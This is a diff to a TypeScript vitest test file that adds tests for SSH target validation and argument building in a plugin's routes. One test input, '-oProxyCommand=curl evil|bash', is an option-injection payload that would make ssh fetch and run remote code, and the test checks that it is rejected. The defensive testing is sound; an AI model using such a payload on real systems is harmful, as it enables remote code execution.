@@ -1,6 +1,6 @@
 import { describe, expect, it, vi } from 'vitest';
 import type { LoadedPlugin } from '../types';
-import { buildServicesRegistry, registerPluginRoutes } from './routes';
+import { buildServicesRegistry, buildSshExecArgs, registerPluginRoutes, validateSshTarget } from './routes';
 
 function createLoadedPlugin(overrides: Partial<LoadedPlugin> = {}): LoadedPlugin {
   return {
@@ -41,6 +41,22 @@ function createResponse() {
 }
 
 describe('entity-services routes', () => {
+  it('rejects ssh targets that could be parsed as ssh options', () => {
+    expect(() => validateSshTarget('-oProxyCommand=curl evil|bash')).toThrow(
+      'SSH target must not start with "-".',
+    );
+  });
+
+  it('inserts the ssh option terminator before the validated host', () => {
+    expect(buildSshExecArgs('book@mac-host', 'echo ok')).toEqual([
+      '-o',
+      'ConnectTimeout=10',
+      '--',
+      'book@mac-host',
+      'echo ok',
+    ]);
+  });
+
   it('builds a registry payload with live service summaries', async () => {
     const entityServices = createLoadedPlugin();
     const entityLinker = createLoadedPlugin({
